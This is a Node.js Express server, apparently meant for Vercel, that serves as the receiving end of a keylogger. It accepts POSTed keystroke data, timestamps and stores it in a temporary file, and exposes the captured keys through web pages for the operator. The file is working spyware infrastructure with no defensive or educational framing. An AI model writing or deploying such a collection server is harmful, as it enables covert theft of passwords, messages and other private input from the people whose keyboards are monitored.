const fs = require("fs")
const express = require("express")
const bodyParser = require("body-parser")

const app = express()
app.use(bodyParser.json({ extended: true }))

const port = process.env.PORT || 8080 // Use Vercel's dynamic port

// File path for logging (use /tmp since Vercel root is read-only)
const logFilePath = "/tmp/keyboard_capture.txt"

// Ensure the /tmp directory has a log file (Vercel resets /tmp on each deployment)
if (!fs.existsSync(logFilePath)) {
  fs.writeFileSync(logFilePath, "")
}

app.get("/", (req, res) => {
  try {
    const kl_file = fs.readFileSync(logFilePath, {
      encoding: "utf8",
      flag: "r",
    })

    const formattedData = kl_file
      .split("\n")
      .filter((line) => line.trim() !== "")
      .map((line) => `<li>${line}</li>`)
      .join("")

    res.send(`<h1>Logged Data</h1><ul>${formattedData}</ul>`)
  } catch {
    res.send("<h1>Nothing logged yet.</h1>")
  }
})

app.post("/", (req, res) => {
  console.log(req.body.keyboardData)

  const timestamp = new Date().toLocaleString("en-PH", {
    timeZone: "Asia/Manila",
  })

  let newEntry = ""

  const data = req.body.keyboardData
  if (data.startsWith("Key")) {
    newEntry = `[${timestamp}] - Key pressed: ${data.replace("Key.", "")}`
  } else {
    newEntry = `[${timestamp}] - Input: ${data}`
  }

  let existingContent = ""
  if (fs.existsSync(logFilePath)) {
    existingContent = fs.readFileSync(logFilePath, "utf8")
  }

  const updatedContent = newEntry + "\n" + existingContent
  fs.writeFileSync(logFilePath, updatedContent)

  res.send("Successfully added the data at the top!")
})
app.get("/logs", (req, res) => {
  const logFilePath = "/tmp/keyboard_capture.txt"

  if (!fs.existsSync(logFilePath)) {
    return res.status(404).json({ message: "No logs found." })
  }

  const logs = fs.readFileSync(logFilePath, "utf8")
  res.setHeader("Content-Type", "text/plain") // Set response as plain text
  res.send(logs)
})

app.listen(port, () => {
  console.log(`App is listening on port ${port}`)
})
